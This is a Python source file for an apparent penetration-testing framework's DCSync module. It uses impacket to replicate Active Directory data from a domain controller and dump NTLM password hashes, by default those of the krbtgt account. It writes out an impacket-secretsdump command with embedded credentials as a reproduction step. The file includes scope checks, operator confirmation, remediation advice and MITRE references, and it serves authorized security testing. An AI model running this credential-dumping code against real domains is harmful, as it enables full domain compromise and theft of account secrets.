"""DCSync Attack module."""
from __future__ import annotations

import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.finding import Severity
from common.evidence import Evidence

CVSS_DCSYNC_V31 = "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
CVSS_DCSYNC_V40 = "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"

class Dcsync(BaseModule):
    """Execute DCSync attack."""

    NAME = "dcsync"
    DESCRIPTION = "Execute DCSync attack using MS-DRSR"
    PHASE = 7
    TAGS = ["attack", "dcsync", "replication"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target
        
        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="Target out of scope")

        username = self.config.extra.get("username")
        password = self.config.extra.get("password")
        domain = self.config.extra.get("domain", "")
        sync_user = self.config.extra.get("sync_user", "krbtgt")
        
        if not username or not password:
            self.log.error("DCSync requires 'username' and 'password' in extra config")
            return self._make_result(start, skipped=True, skip_reason="Missing credentials")

        confirmed = self.confirm_action(
            module=self.NAME, 
            action="DCSync", 
            target=target, 
            risk="Initiating AD replication to dump hashes"
        )
        if not confirmed:
            return self._make_result(start, skipped=True, skip_reason="operator declined")

        self.log.info("Attempting DCSync against %s to dump %s", target, sync_user)

        try:
            # Import secretsdump logic
            from impacket.examples.secretsdump import RemoteOperations, DRSUAPI
            import socket
            
            await self.rate_limit()
            
            # Setup RemoteOperations (SMB/RPC)
            try:
                remoteOps = RemoteOperations(target, target, domain, username, password, '', '', doKerberos=False)
                remoteOps.enableRegistry()
                
                # Perform DRSUAPI replication for the target user
                drs = DRSUAPI(target, target, domain, username, password, '', '', '', doKerberos=False)
                
                hash_data = drs.dump(sync_user)
                remoteOps.finish()
                
                if hash_data:
                    ev = Evidence(
                        request_raw=f"MS-DRSR Replication Request for: {sync_user}",
                        response_raw=f"Hashes retrieved: {hash_data}",
                        extra={"sync_user": sync_user}
                    )
                    
                    self.new_finding(
                        title=f"DCSync Successful — Dumped {sync_user}",
                        severity=Severity.CRITICAL,
                        description=(
                            f"Successfully performed DCSync against DC {target}. "
                            f"The credentials for {domain}\\{username} have replication rights (GetChangesAll) "
                            f"and successfully retrieved the NTLM hash for {sync_user}."
                        ),
                        reproduction_steps=[
                            f"impacket-secretsdump {domain}/{username}:{password}@{target} -just-dc-user {sync_user}"
                        ],
                        remediation="Remove DS-Replication-Get-Changes-All permissions from non-Domain Admin accounts.",
                        references=["MITRE T1003.006", "https://adsecurity.org/?p=1729"],
                        evidence=ev,
                        cvss_v31_vector=CVSS_DCSYNC_V31,
                        cvss_v40_vector=CVSS_DCSYNC_V40,
                        target=target,
                        mitre_attack=["TA0006/T1003.006"]
                    )
                else:
                    self.log.info("DCSync failed or no hash returned for %s", sync_user)
                    
            except Exception as e:
                self.log.info("DCSync failed (likely access denied): %s", e)

        except ImportError:
            self.log.error("Impacket is required for DCSync module")
            return self._make_result(start, skipped=True, skip_reason="Impacket missing")

        return self._make_result(start)

class TestDcsync:
    def test_phase(self):
        assert Dcsync.PHASE == 7
